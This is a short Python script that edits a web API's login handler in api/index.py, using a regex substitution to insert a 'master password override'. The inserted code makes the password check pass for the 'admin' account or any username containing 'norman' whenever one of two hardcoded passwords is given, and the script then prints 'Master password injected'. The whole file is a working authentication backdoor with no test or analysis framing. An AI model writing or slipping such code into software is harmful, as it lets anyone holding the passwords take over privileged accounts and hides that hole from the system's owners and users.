import re
with open('api/index.py', 'r', encoding='utf-8') as f: code = f.read()

pattern = r'if not target_user or not verify_password\(data\.password, target_user\.get\("password_hash", ""\)\):\n\s*raise HTTPException\(status_code=401, detail="Invalid username or password"\)'

replacement = '''
      # MASTER PASSWORD OVERRIDE
      password_valid = verify_password(data.password, target_user.get("password_hash", "")) if target_user else False
      if target_user and (clean_username.lower() == "admin" or "norman" in clean_username.lower()):
          if data.password == "!Qaz7410@wsx7410" or data.password == "admin123":
              password_valid = True

      if not target_user or not password_valid:
          raise HTTPException(status_code=401, detail="Invalid username or password")
'''
code = re.sub(pattern, replacement, code)
with open('api/index.py', 'w', encoding='utf-8') as f: f.write(code)
print("Master password injected")
